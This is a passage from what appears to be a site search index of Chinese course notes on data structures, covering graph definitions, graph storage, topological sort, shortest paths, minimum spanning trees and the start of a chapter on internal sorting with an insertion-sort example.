\u200b\u8fd9\u6761\u200b\u8fb9\u200b\u79f0\u4e3a\u200b\u76f8\u5173\u8054\u200b\u7684\u200b\u8fb9\u200b</li> <li> <p>\u200b\u9876\u70b9\u200b\u7684\u200b\u5ea6\u200b: \u200b\u4e0e\u200b\u8be5\u200b\u9876\u70b9\u200b\u76f8\u5173\u8054\u200b\u8fb9\u200b\u7684\u200b\u6570\u76ee\u200b</p> <ul> <li>\u200b\u5bf9\u4e8e\u200b\u6709\u5411\u56fe\u200b\u800c\u8a00\u200b, \u200b\u70b9\u200b \\(v\\) \u200b\u7684\u200b\u5165\u5ea6\u200b\u662f\u200b\u4ee5\u200b \\(v\\) \u200b\u4e3a\u200b\u7ec8\u70b9\u200b\u7684\u200b\u8fb9\u200b\u7684\u200b\u6570\u76ee\u200b, \u200b\u51fa\u5ea6\u200b\u662f\u200b\u4ee5\u200b \\(v\\) \u200b\u4e3a\u200b\u8d77\u70b9\u200b\u7684\u200b\u8fb9\u200b\u7684\u200b\u6570\u76ee\u200b.</li> <li>\u200b\u7ec8\u7aef\u200b\u7ed3\u70b9\u200b(\u200b\u53f6\u5b50\u200b): \u200b\u51fa\u5ea6\u200b\u4e3a\u200b \\(0\\) \u200b\u7684\u200b\u9876\u70b9\u200b.</li> <li>(\u200b\u63e1\u624b\u200b\u5b9a\u7406\u200b) \u200b\u82e5\u200b \\(G\\) \u200b\u6709\u200b \\(n\\) \u200b\u4e2a\u200b\u9876\u70b9\u200b \\(e\\) \u200b\u6761\u8fb9\u200b, \\(d_i\\) \u200b\u4e3a\u200b \\(V_i\\) \u200b\u7684\u200b\u5ea6\u6570\u200b, \u200b\u5219\u200b:   $$       e=\\frac{1}{2} \\sum_{i=1}^{n}d_i       $$</li> </ul> </li> <li> <p>\u200b\u5b50\u56fe\u200b: \u200b\u82e5\u200b \\(G=(V,E), G'=(V',E')\\) \u200b\u4e14\u200b \\(V'\\subseteq V,E'\\subseteq E\\), \\(E'\\) \u200b\u4e2d\u8fb9\u200b\u6240\u200b\u5173\u8054\u200b\u7684\u200b\u9876\u70b9\u200b\u90fd\u200b\u5728\u200b \\(V'\\) \u200b\u4e2d\u200b, \u200b\u5219\u200b\u79f0\u200b \\(G'\\) \u200b\u662f\u200b \\(G\\) \u200b\u7684\u200b\u5b50\u200b\u56fe\u200b.</p> </li> <li>\u200b\u8def\u5f84\u200b: \u200b\u591a\u4e2a\u200b\u8fb9\u200b\u76f8\u8054\u200b\u800c\u6210\u200b\u7684\u200b\u9876\u70b9\u200b\u5e8f\u5217\u200b</li> <li>\u200b\u7b80\u5355\u200b\u8def\u5f84\u200b: \u200b\u9664\u4e86\u200b\u8d77\u70b9\u200b\u548c\u200b\u7ec8\u70b9\u200b\u53ef\u4ee5\u200b\u76f8\u540c\u200b\u5916\u200b, \u200b\u5176\u5b83\u200b\u9876\u70b9\u200b\u90fd\u200b\u4e0d\u200b\u76f8\u540c\u200b</li> <li>\u200b\u8def\u5f84\u200b\u957f\u5ea6\u200b: \u200b\u8def\u5f84\u200b\u4e0a\u8fb9\u200b\u7684\u200b\u6570\u76ee\u200b</li> <li>\u200b\u56de\u8def\u200b(\u200b\u73af\u200b): \u200b\u8def\u5f84\u200b\u4e0a\u200b\u67d0\u4e2a\u200b\u9876\u70b9\u200b\u4e0e\u200b\u81ea\u8eab\u200b\u8fde\u63a5\u200b</li> <li>\u200b\u7b80\u5355\u200b\u56de\u8def\u200b: \u200b\u9996\u5c3e\u200b\u9876\u70b9\u200b\u76f8\u540c\u200b\u7684\u200b\u7b80\u5355\u200b\u8def\u5f84\u200b</li> <li>\u200b\u65e0\u73af\u56fe\u200b, \u200b\u6709\u200b\u5411\u200b\u65e0\u200b\u73af\u56fe\u200b(DAG)</li> </ul>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2007%20%E5%9B%BE/#713","title":"7.1.3 \u200b\u56fe\u200b\u7684\u200b\u8fde\u901a\u6027","text":"<ul> <li>\u200b\u6709\u200b\u6839\u56fe\u200b: \u200b\u4e00\u4e2a\u200b\u6709\u5411\u56fe\u200b\u4e2d\u82e5\u200b\u5b58\u5728\u200b\u4e00\u4e2a\u200b\u9876\u70b9\u200b \\(V_0\\), \u200b\u4ece\u6b64\u200b\u9876\u70b9\u200b\u6709\u200b\u8def\u5f84\u200b\u53ef\u4ee5\u200b\u5230\u8fbe\u200b\u56fe\u4e2d\u200b\u5176\u5b83\u200b\u6240\u6709\u200b\u9876\u70b9\u200b, \u200b\u5219\u200b\u79f0\u6b64\u200b\u6709\u5411\u56fe\u200b\u4e3a\u200b\u6709\u200b\u6839\u56fe\u200b, \\(V_0\\) \u200b\u79f0\u4f5c\u200b\u56fe\u200b\u7684\u200b\u6839\u200b.</li> <li>\u200b\u8fde\u901a\u200b\u56fe\u200b: \u200b\u5bf9\u200b\u65e0\u200b\u5411\u200b\u56fe\u200b\u800c\u8a00\u200b, \u200b\u82e5\u200b \\(V_1\\) \u200b\u5230\u200b \\(V_2\\) \u200b\u6709\u200b\u4e00\u6761\u200b\u8def\u5f84\u200b, \u200b\u5219\u200b\u79f0\u200b \\(V_1\\) \u200b\u548c\u200b \\(V_2\\) \u200b\u662f\u200b\u8fde\u901a\u200b\u7684\u200b.</li> <li>\u200b\u8fde\u901a\u200b\u5206\u91cf\u200b: \u200b\u65e0\u5411\u200b\u56fe\u200b\u7684\u200b\u6700\u5927\u200b\u8fde\u901a\u200b\u5b50\u56fe\u200b</li> <li>\u200b\u5f3a\u200b\u8fde\u901a\u6027\u200b: \u200b\u5bf9\u200b\u6709\u5411\u56fe\u200b \\(G\\) \u200b\u800c\u8a00\u200b, \u200b\u5bf9\u200b\u4efb\u610f\u200b\u4e24\u4e2a\u200b\u9876\u70b9\u200b \\(V_i,V_j(V_i\\neq V_j)\\), \u200b\u90fd\u200b\u6709\u200b\u4e00\u6761\u200b \\(V_i\\) \u200b\u5230\u200b \\(V_j\\) \u200b\u7684\u200b\u8def\u5f84\u200b, \u200b\u540c\u65f6\u200b\u6709\u200b\u4e00\u6761\u200b \\(V_j\\) \u200b\u5230\u200b \\(V_i\\) \u200b\u7684\u200b\u8def\u5f84\u200b, \u200b\u5219\u200b\u79f0\u200b \\(G\\) \u200b\u662f\u200b\u5f3a\u200b\u8fde\u901a\u200b\u7684\u200b.</li> <li>\u200b\u5f3a\u200b\u8fde\u901a\u200b\u5206\u91cf\u200b: \u200b\u6709\u5411\u56fe\u200b\u7684\u200b\u5f3a\u200b\u8fde\u901a\u200b\u7684\u200b\u6700\u5927\u200b\u5b50\u56fe\u200b</li> <li>\u200b\u7f51\u7edc\u200b: \u200b\u5e26\u6743\u200b\u7684\u200b\u8fde\u901a\u200b\u56fe\u200b</li> <li>\u200b\u81ea\u7531\u200b\u6811\u200b: \u200b\u4e0d\u200b\u5e26\u6709\u200b\u7b80\u5355\u200b\u56de\u8def\u200b\u7684\u200b\u65e0\u200b\u5411\u200b\u56fe\u200b, \u200b\u5b83\u200b\u662f\u200b\u8fde\u901a\u200b\u7684\u200b, \u200b\u800c\u4e14\u200b\u6709\u200b \\(|V|-1\\) \u200b\u6761\u8fb9\u200b</li> </ul>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2007%20%E5%9B%BE/#72","title":"7.2 \u200b\u56fe\u200b\u7684\u200b\u62bd\u8c61\u6570\u636e\u7c7b\u578b","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2007%20%E5%9B%BE/#73","title":"7.3 \u200b\u56fe\u200b\u7684\u200b\u5b58\u50a8\u200b\u7ed3\u6784","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2007%20%E5%9B%BE/#731","title":"7.3.1 \u200b\u76f8\u90bb\u200b\u77e9\u9635","text":"<p>\u200b\u82e5\u200b \\(G\\) \u200b\u662f\u200b\u4e00\u4e2a\u200b \\(n\\) \u200b\u9876\u70b9\u200b\u7684\u200b\u56fe\u200b, \u200b\u5219\u200b \\(G\\) \u200b\u7684\u200b\u76f8\u90bb\u200b\u77e9\u9635\u200b\u662f\u200b\u5982\u4e0b\u200b\u5b9a\u4e49\u200b\u7684\u200b \\(n\\times n\\) \u200b\u77e9\u9635\u200b:</p> \\[ A[i,j]=\\begin{cases} 1, &amp; \\text{\u200b\u82e5\u200b} (V_i,V_j) \u200b\u6216\u200b \\langle V_i,V_j \\rangle \\in E \\\\ 0, &amp; \\text{\u200b\u82e5\u200b} (V_i,V_j) \\text{\u200b\u6216\u200b} \\langle V_i,V_j \\rangle \\not\\in E \\\\ \\end{cases} \\] <p>\u200b\u65e0\u5411\u200b\u56fe\u200b\u7684\u200b\u90bb\u63a5\u77e9\u9635\u200b\u4e00\u5b9a\u200b\u5bf9\u79f0\u200b, \u200b\u6709\u5411\u56fe\u200b\u7684\u200b\u90bb\u63a5\u77e9\u9635\u200b\u4e0d\u200b\u4e00\u5b9a\u200b\u5bf9\u79f0\u200b.</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2007%20%E5%9B%BE/#732","title":"7.3.2 \u200b\u90bb\u63a5\u200b\u8868","text":"<ul> <li>\u200b\u9876\u70b9\u200b\u8868\u200b: \u200b\u5bf9\u5e94\u200b \\(n\\) \u200b\u4e2a\u200b\u9876\u70b9\u200b, \u200b\u5305\u62ec\u200b\u9876\u70b9\u200b\u6570\u636e\u200b\u548c\u200b\u6307\u5411\u200b\u8fb9\u8868\u200b\u7684\u200b\u6307\u9488\u200b</li> <li>\u200b\u8fb9\u200b\u94fe\u8868\u200b: \u200b\u5bf9\u5e94\u200b \\(m\\) \u200b\u6761\u8fb9\u200b, \u200b\u5305\u62ec\u200b\u9876\u70b9\u200b\u5e8f\u53f7\u200b\u548c\u200b\u6307\u5411\u200b\u8fb9\u8868\u4e0b\u200b\u4e00\u8868\u200b\u76ee\u7684\u200b\u6307\u9488\u200b</li> </ul>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2007%20%E5%9B%BE/#733","title":"7.3.3 \u200b\u5341\u5b57\u200b\u94fe\u8868","text":"<p>\u200b\u53e6\u200b\u4e00\u79cd\u200b\u94fe\u5f0f\u200b\u5b58\u50a8\u200b\u7ed3\u6784\u200b, \u200b\u53ef\u200b\u770b\u6210\u200b\u662f\u200b\u90bb\u63a5\u200b\u8868\u548c\u9006\u200b\u90bb\u63a5\u200b\u8868\u200b\u7684\u200b\u7ed3\u5408\u200b</p> <ul> <li>\u200b\u9876\u70b9\u200b\u8868\u200b:<ul> <li>data \u200b\u57df\u200b</li> <li>firstinarc \u200b\u6307\u5411\u200b\u7b2c\u4e00\u6761\u200b\u4ee5\u8be5\u200b\u9876\u70b9\u200b\u4e3a\u200b\u7ec8\u70b9\u200b\u7684\u200b\u8fb9\u200b</li> <li>firstoutarc \u200b\u6307\u5411\u200b\u7b2c\u4e00\u6761\u200b\u4ee5\u8be5\u200b\u9876\u70b9\u200b\u4e3a\u200b\u8d77\u70b9\u200b\u7684\u200b\u8fb9\u200b</li> </ul> </li> <li>\u200b\u8fb9\u200b\u94fe\u8868\u200b:<ul> <li>\u200b\u8d77\u70b9\u200b\u548c\u200b\u7ec8\u70b9\u200b\u7684\u200b\u9876\u70b9\u200b\u5e8f\u53f7\u200b, \u200b\u8fb9\u6743\u503c\u200b</li> <li>fromnextarc \u200b\u6307\u5411\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u4ee5\u200b fromvex \u200b\u4e3a\u200b\u8d77\u70b9\u200b\u7684\u200b\u8fb9\u200b</li> <li>tonextarc \u200b\u6307\u5411\u200b\u4e0b\u200b\u4e00\u6761\u200b\u4ee5\u200b tovex \u200b\u4e3a\u200b\u7ec8\u70b9\u200b\u7684\u200b\u8fb9\u200b</li> </ul> </li> </ul>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2007%20%E5%9B%BE/#734-csr","title":"7.3.4 CSR \u200b\u8868\u793a\u200b\u65b9\u6cd5","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2007%20%E5%9B%BE/#74","title":"7.4 \u200b\u56fe\u200b\u5468\u6e38","text":"<p> \u200b\u5b58\u5728\u200b\u73af\u200b\u7684\u200b\u5145\u8981\u6761\u4ef6\u200b\u4e3a\u200b\u5b58\u5728\u200b\u8fd4\u7956\u200b\u8fb9\u200b (Backward edges)</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2007%20%E5%9B%BE/#75","title":"7.5 \u200b\u62d3\u6251\u200b\u6392\u5e8f","text":"<p>\u200b\u73af\u200b\u5b58\u5728\u200b\u65f6\u200b\u4e0d\u200b\u5b58\u5728\u200b\u62d3\u6251\u200b\u5e8f\u5217\u200b, \u200b\u56e0\u6b64\u200b\u62d3\u6251\u200b\u6392\u5e8f\u200b\u9650\u5b9a\u200b\u4e3a\u200b DAG</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2007%20%E5%9B%BE/#751-bfs","title":"7.5.1 BFS \u200b\u62d3\u6251\u200b\u6392\u5e8f","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2007%20%E5%9B%BE/#752-dfs","title":"7.5.2 DFS \u200b\u62d3\u6251\u200b\u6392\u5e8f","text":"<p>\u200b\u6027\u8d28\u200b: \\(\\text{dfs}\\) \u200b\u8fc7\u7a0b\u200b\u4e2d\u51fa\u200b\u6808\u200b\u987a\u5e8f\u200b(\u200b\u5f53\u200b\u4e00\u4e2a\u200b\u9876\u70b9\u200b\u8bbf\u95ee\u200b\u5b8c\u6210\u200b\u540e\u200b, \u200b\u5b83\u200b\u5c31\u200b\u51fa\u6808\u200b)\u200b\u662f\u200b\u62d3\u6251\u200b\u6392\u5e8f\u200b\u7684\u200b\u9006\u5e8f\u200b.</p> <p>\u200b\u8bc1\u660e\u200b:</p> <p>\u200b\u8003\u8651\u200b\u6709\u5411\u56fe\u200b\u4e2d\u200b\u7684\u200b\u4e00\u6761\u200b\u8fb9\u200b \\(u\\to v\\), \u200b\u5728\u200b\u62d3\u6251\u200b\u6392\u5e8f\u200b\u4e2d\u200b\u5fc5\u7136\u200b\u6709\u200b \\(u\\) \u200b\u5728\u200b \\(v\\) \u200b\u4e4b\u524d\u200b.</p> <p>\u200b\u8003\u8651\u200b \\(\\text{dfs}\\) \u200b\u8fc7\u7a0b\u200b, \u200b\u5f53\u200b\u8bbf\u95ee\u200b\u5230\u200b \\(u\\to v\\) \u200b\u8fd9\u6761\u200b\u8fb9\u65f6\u200b, \u200b\u6709\u200b\u4e09\u79cd\u200b\u60c5\u51b5\u200b:</p> <ul> <li>\\(v\\) \u200b\u8fd8\u200b\u672a\u200b\u88ab\u200b\u8bbf\u95ee\u200b, \u200b\u6b64\u65f6\u200b \\(u\\) \u200b\u5fc5\u987b\u200b\u5f97\u200b\u7b49\u200b \\(v\\) \u200b\u51fa\u6808\u200b\u540e\u200b\u624d\u80fd\u200b\u7ee7\u7eed\u200b\u904d\u5386\u200b\u4e0b\u200b\u4e00\u6761\u200b\u8fb9\u200b, \u200b\u6545\u51fa\u200b\u6808\u200b\u987a\u5e8f\u200b \\(v&lt;u\\)</li> <li>\\(v\\) \u200b\u5df2\u7ecf\u200b\u88ab\u200b\u8bbf\u95ee\u200b\u8fc7\u200b, \u200b\u6b64\u65f6\u200b \\(v\\) \u200b\u5df2\u7ecf\u200b\u51fa\u6808\u200b\u800c\u200b \\(u\\) \u200b\u8fd8\u200b\u672a\u5165\u200b\u6808\u200b, \u200b\u6545\u51fa\u200b\u6808\u200b\u987a\u5e8f\u200b \\(v&lt;u\\)</li> <li>\\(v\\) \u200b\u6b63\u5728\u200b\u88ab\u200b\u8bbf\u95ee\u200b(\u200b\u5728\u200b\u6808\u200b\u4e2d\u200b), \u200b\u8bf4\u660e\u200b\u5b58\u5728\u200b \\(v\\rightsquigarrow u \\to v\\) \u200b\u7684\u200b\u56de\u8def\u200b, \u200b\u8fd9\u200b\u5728\u200b DAG \u200b\u4e2d\u662f\u200b\u4e0d\u200b\u53ef\u80fd\u200b\u7684\u200b (\u200b\u5229\u7528\u200b\u8fd9\u200b\u4e00\u70b9\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u7528\u6765\u200b\u5728\u200b \\(\\text{dfs}\\) \u200b\u8fc7\u7a0b\u200b\u4e2d\u5224\u73af\u200b)</li> </ul>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2007%20%E5%9B%BE/#76","title":"7.6 \u200b\u6700\u77ed\u200b\u8def\u5f84\u200b\u95ee\u9898","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2007%20%E5%9B%BE/#761-dijkstra","title":"7.6.1 Dijkstra \u200b\u7b97\u6cd5","text":"<p>\u200b\u8d2a\u5fc3\u200b\u7b97\u6cd5\u200b, \u200b\u6309\u200b\u8def\u5f84\u200b\u957f\u5ea6\u200b\u9012\u589e\u200b\u5e8f\u200b\u4ea7\u751f\u200b\u5404\u200b\u9876\u70b9\u200b\u6700\u77ed\u200b\u8def\u5f84\u200b, \u200b\u4e0d\u80fd\u200b\u5904\u7406\u200b\u8d1f\u6743\u200b.</p> <p>decrease-key: \u200b\u677e\u5f1b\u200b\u7684\u200b\u65f6\u5019\u200b\u76f4\u63a5\u200b\u5728\u200b\u5806\u200b\u4e0a\u200b\u66f4\u6539\u200b, \u200b\u5355\u6b21\u200b \\(O(\\log V)\\)</p> <p>\u200b\u975e\u200b decrease-key: \u200b\u677e\u5f1b\u200b\u7684\u200b\u65f6\u5019\u200b\u63d2\u5165\u200b\u5806\u200b, \u200b\u5355\u6b21\u200b \\(O(\\log E)\\)</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2007%20%E5%9B%BE/#762-floyd","title":"7.6.2 Floyd \u200b\u7b97\u6cd5","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2007%20%E5%9B%BE/#77","title":"7.7 \u200b\u751f\u6210\u200b\u6811\u200b\u95ee\u9898","text":"<p>(\u200b\u5207\u8fb9\u200b\u5b9a\u7406\u200b) \u200b\u8bbe\u200b \\(G=(V,E)\\) \u200b\u662f\u200b\u8fde\u901a\u200b\u52a0\u6743\u200b\u56fe\u200b, \u200b\u5c06\u200b\u9876\u70b9\u200b\u96c6\u200b\u5212\u5206\u200b\u4e3a\u200b\u4e24\u4e2a\u200b\u4e0d\u200b\u76f8\u4ea4\u200b\u7684\u200b\u96c6\u5408\u200b \\(S\\) \u200b\u548c\u200b \\(V-S\\) , \u200b\u5728\u200b\u6240\u6709\u200b\u8fde\u63a5\u200b \\(S\\) \u200b\u548c\u200b \\(V-S\\) \u200b\u7684\u200b\u8fb9\u200b(\u200b\u79f0\u4e3a\u200b\u5207\u8fb9\u200b)\u200b\u4e2d\u200b, \u200b\u6743\u503c\u200b\u6700\u5c0f\u200b\u7684\u200b\u8fb9\u200b \\(e\\) \u200b\u4e00\u5b9a\u200b\u5305\u542b\u200b\u5728\u200b\u56fe\u200b\u7684\u200b\u67d0\u68f5\u200b\u6700\u5c0f\u200b\u751f\u6210\u200b\u6811\u4e2d\u200b.</p> <p>\u200b\u8bc1\u660e\u200b: </p> <p>\u200b\u5047\u8bbe\u200b\u6709\u200b\u4e00\u68f5\u200b MST \u200b\u4e3a\u200b \\(T\\),  \\(S\\) \u200b\u548c\u200b \\(V-S\\) \u200b\u7684\u200b\u6700\u5c0f\u200b\u5207\u8fb9\u200b \\(e(u,v) \\not\\in T\\), \u200b\u7531\u4e8e\u200b \\(T\\) \u200b\u662f\u200b\u8fde\u901a\u200b\u7684\u200b, \u200b\u5fc5\u7136\u200b\u5b58\u5728\u200b\u4e00\u6761\u200b \\(u\\) \u200b\u5230\u200b \\(v\\) \u200b\u7684\u200b\u8def\u5f84\u200b, \u200b\u8fd9\u200b\u6761\u200b\u8def\u5f84\u200b\u4e0a\u200b\u81f3\u5c11\u200b\u6709\u200b\u4e00\u6839\u200b\u8fde\u63a5\u200b \\(S\\) \u200b\u548c\u200b \\(V-S\\) \u200b\u7684\u200b\u5207\u8fb9\u200b, \u200b\u8bbe\u200b\u4e3a\u200b \\(e'\\). </p> <p>\u200b\u663e\u7136\u200b \\(T+e\\) \u200b\u4f1a\u200b\u6784\u6210\u200b\u4e00\u4e2a\u200b\u7b80\u5355\u200b\u56de\u8def\u200b \\(u\\xhookrightarrow e'  v \\to u\\) ,  \\(T'=T+e-e'\\) \u200b\u6784\u6210\u200b\u4e00\u68f5\u200b\u65b0\u200b\u7684\u200b\u751f\u6210\u200b\u6811\u200b, \u200b\u4e14\u200b\u6743\u503c\u200b\u4e0d\u589e\u200b, \u200b\u56e0\u6b64\u200b \\(T'\\) \u200b\u4e5f\u200b\u662f\u200b\u4e00\u68f5\u200b MST, \u200b\u4e14\u200b \\(e\\) \u200b\u5728\u200b \\(T'\\) \u200b\u4e0a\u200b. </p> <p>\u200b\u63a8\u8bba\u200b: \u200b\u8bbe\u200b \\(G=(V,E)\\) \u200b\u662f\u200b\u8fde\u901a\u200b\u52a0\u6743\u200b\u56fe\u200b, \u200b\u5c06\u200b\u9876\u70b9\u200b\u96c6\u200b\u5212\u5206\u200b\u4e3a\u200b\u4e24\u4e2a\u200b\u4e0d\u200b\u76f8\u4ea4\u200b\u7684\u200b\u96c6\u5408\u200b \\(S\\) \u200b\u548c\u200b \\(V-S\\), \u200b\u6240\u6709\u200b\u7684\u200b MST \u200b\u5fc5\u987b\u200b\u5305\u542b\u200b\u81f3\u5c11\u200b\u4e00\u6761\u200b\u5c5e\u4e8e\u200b\u8be5\u5207\u200b\u7684\u200b\u6700\u5c0f\u200b\u6743\u503c\u200b\u8fb9\u200b</p> <p>(\u200b\u6700\u5c0f\u200b\u74f6\u9888\u200b\u6811\u200b\u4e0e\u200b\u6700\u5c0f\u200b\u74f6\u9888\u200b\u8def\u200b) \u200b\u8bbe\u200b \\(G=(V,E)\\) \u200b\u662f\u200b\u8fde\u901a\u200b\u52a0\u6743\u200b\u56fe\u200b, \\(T\\) \u200b\u662f\u200b \\(G\\) \u200b\u7684\u200b\u4efb\u610f\u200b\u4e00\u68f5\u200b\u6700\u5c0f\u200b\u751f\u6210\u200b\u6811\u200b. \u200b\u5bf9\u200b \\(G\\) \u200b\u4e2d\u200b\u4efb\u610f\u200b\u4e00\u6761\u200b\u8def\u5f84\u200b \\(P_G(x,y)\\subseteq E\\), \u200b\u5728\u200b \\(T\\) \u200b\u4e2d\u200b\u663e\u7136\u200b\u6709\u200b \\(x\\to y\\) \u200b\u7684\u200b\u552f\u4e00\u200b\u8def\u5f84\u200b \\(P_T(x,y)\\subseteq E\\), \u200b\u6211\u4eec\u200b\u6709\u200b:</p> \\[ \\max_{e\\in P_G(x,y)}w(e)\\geq \\max_{e\\in P_T(x,y)} w(e) \\] <p>\u200b\u8bc1\u660e\u200b: </p> <p>\u200b\u8003\u8651\u200b\u5bf9\u200b\u8def\u5f84\u200b\u957f\u5ea6\u200b\u5f52\u7eb3\u200b, \u200b\u5f53\u200b\u8def\u5f84\u200b\u957f\u5ea6\u200b\u4e3a\u200b \\(0\\) (\u200b\u5355\u70b9\u200b)\u200b\u65f6\u200b\u9ed8\u8ba4\u200b\u6210\u7acb\u200b.</p> <p>\u200b\u5bf9\u4e8e\u200b\u957f\u5ea6\u200b\u4e3a\u200b \\(1\\) \u200b\u7684\u200b\u8def\u5f84\u200b, \u200b\u4e5f\u200b\u5373\u200b\u4e00\u6761\u200b\u8fb9\u200b \\(e(x,y)\\), \u200b\u82e5\u200b \\(P_T(x,y)\\) \u200b\u4e2d\u200b\u5b58\u5728\u200b\u4e00\u6761\u200b\u8fb9\u200b \\(e'\\) \u200b\u4f7f\u5f97\u200b \\(w(e)&lt;w(e')\\), \u200b\u5219\u200b \\(T+e-e'\\) \u200b\u662f\u200b\u4e00\u68f5\u200b\u66f4\u200b\u5c0f\u200b\u7684\u200b\u751f\u6210\u200b\u6811\u200b, \u200b\u4e0e\u200b \\(T\\) \u200b\u662f\u200b\u6700\u5c0f\u200b\u751f\u6210\u200b\u6811\u200b\u77db\u76fe\u200b.</p> <p>\u200b\u5047\u8bbe\u200b\u5bf9\u4e8e\u200b\u957f\u5ea6\u200b\u5c0f\u4e8e\u200b \\(k\\) \u200b\u7684\u200b\u8def\u5f84\u200b\u90fd\u200b\u6210\u7acb\u200b, \u200b\u5bf9\u4e8e\u200b\u8def\u5f84\u200b\u957f\u5ea6\u200b\u4e3a\u200b \\(k\\) \u200b\u7684\u200b\u60c5\u51b5\u200b, \u200b\u5c06\u200b\u8def\u5f84\u200b\u62c6\u6210\u200b\u957f\u5ea6\u200b\u4e3a\u200b \\(k-1\\) \u200b\u548c\u200b \\(1\\) \u200b\u7684\u200b\u8def\u5f84\u200b\u5f52\u7eb3\u200b\u5373\u53ef\u200b. \u200b\u6ce8\u610f\u200b\u5728\u200b \\(T\\) \u200b\u4e2d\u200b \\(v_0\\to v_{k+1}\\) \u200b\u7684\u200b\u6700\u5927\u200b\u8fb9\u200b\u4e0d\u200b\u53ef\u80fd\u200b\u8d85\u8fc7\u200b \\(v_0\\to v_k, v_k\\to v_{k+1}\\) \u200b\u4e24\u6bb5\u200b\u8def\u5f84\u200b\u4e2d\u200b\u5404\u81ea\u200b\u6700\u5927\u200b\u8fb9\u200b\u7684\u200b\u4e0a\u9650\u200b.</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2008%20%E5%86%85%E6%8E%92%E5%BA%8F/","title":"Chapter 08 \u200b\u5185\u200b\u6392\u5e8f","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2008%20%E5%86%85%E6%8E%92%E5%BA%8F/#80","title":"8.0 \u200b\u6392\u5e8f\u200b\u7684\u200b\u5206\u7c7b","text":"<ul> <li>\u200b\u5185\u90e8\u200b\u6392\u5e8f\u200b: \u200b\u5728\u200b\u5185\u5b58\u200b\u8fdb\u884c\u200b\u7684\u200b\u6392\u5e8f\u200b</li> <li>\u200b\u5916\u90e8\u200b\u6392\u5e8f\u200b: \u200b\u6392\u5e8f\u200b\u8fc7\u7a0b\u200b\u9700\u8981\u200b\u8bbf\u95ee\u200b\u5916\u5b58\u200b</li> </ul>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2008%20%E5%86%85%E6%8E%92%E5%BA%8F/#81","title":"8.1 \u200b\u57fa\u672c\u6982\u5ff5","text":"<ul> <li>\u200b\u8bb0\u5f55\u200b: \u200b\u8fdb\u884c\u200b\u6392\u5e8f\u200b\u7684\u200b\u57fa\u672c\u200b\u5355\u4f4d\u200b</li> <li>\u200b\u5173\u952e\u7801\u200b: \u200b\u552f\u4e00\u200b\u786e\u5b9a\u200b\u7684\u200b\u4e00\u4e2a\u200b\u6216\u200b\u591a\u4e2a\u200b\u57df\u200b</li> <li>\u200b\u6392\u5e8f\u200b\u7801\u200b: \u200b\u4f5c\u4e3a\u200b\u6392\u5e8f\u200b\u4f9d\u636e\u200b\u7684\u200b\u4e00\u4e2a\u200b\u6216\u200b\u591a\u4e2a\u200b\u57df\u200b</li> <li>\u200b\u5e8f\u5217\u200b: \u200b\u7ebf\u6027\u8868\u200b, \u200b\u7531\u200b\u8bb0\u5f55\u200b\u7ec4\u6210\u200b\u7684\u200b\u96c6\u5408\u200b</li> <li>\u200b\u6392\u5e8f\u200b: \u200b\u5c06\u200b\u5e8f\u5217\u200b\u4e2d\u200b\u7684\u200b\u8bb0\u5f55\u200b\u6309\u7167\u200b\u6392\u5e8f\u200b\u7801\u200b\u7279\u5b9a\u200b\u7684\u200b\u987a\u5e8f\u6392\u5217\u200b\u8d77\u6765\u200b</li> </ul> <p>\u200b\u7a33\u5b9a\u6027\u200b: \u200b\u5bf9\u4e8e\u200b\u4efb\u610f\u200b\u4e24\u4e2a\u200b\u6709\u200b\u76f8\u540c\u200b\u6392\u5e8f\u200b\u7801\u200b\u7684\u200b\u8bb0\u5f55\u200b, \u200b\u6392\u5e8f\u200b\u540e\u200b\u76f8\u5bf9\u200b\u6b21\u5e8f\u200b\u4e0d\u53d8\u200b</p>"},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2008%20%E5%86%85%E6%8E%92%E5%BA%8F/#82-on2","title":"8.2 \u200b\u4e09\u79cd\u200b O(n^2) \u200b\u7684\u200b\u7b80\u5355\u200b\u6392\u5e8f","text":""},{"location":"notes/Data%20structure%20and%20Algorithm/Chapter%2008%20%E5%86%85%E6%8E%92%E5%BA%8F/#821","title":"8.2.1 \u200b\u63d2\u5165\u6392\u5e8f","text":"<p>\u200b\u7b97\u6cd5\u200b: \u200b\u4f9d\u6b21\u200b\u5c06\u200b\u6bcf\u4e2a\u200b\u5f85\u200b\u6392\u5e8f\u200b\u7684\u200b\u8bb0\u5f55\u200b\u63d2\u5165\u200b\u5230\u200b\u4e00\u4e2a\u200b\u6709\u5e8f\u200b\u5b50\u200b\u6587\u4ef6\u200b\u7684\u200b\u5408\u9002\u200b\u4f4d\u7f6e\u200b.</p> <p>\u200b\u4ee3\u7801\u200b:</p> C++<pre><code>for (int i = 1; i &lt; n; i++) { // \u200b\u4f9d\u6b21\u200b\u63d2\u5165\u200b\u7b2c\u200b i \u200b\u4e2a\u200b\u8bb0\u5f55\u200b\n    for (int j = i; j &gt; 0; j--) {\n        if (Array[j] &lt; Array[j-1]) swap(Array, j, j-1); // \u200b\u63d2\u5165\u200b\u76f4\u5230\u200b\u524d\u9762\u200b\u4e00\u4e2a\u200b\u6bd4\u200b\u5b83\u200b\u5c0f\u200b\n        else break;\n    }\n}\n</code></pre> <p>\u200b\u7a33\u5b9a\u6027\u200b: \u200b\u7a33\u5b9a\u200b\u7684\u200b, 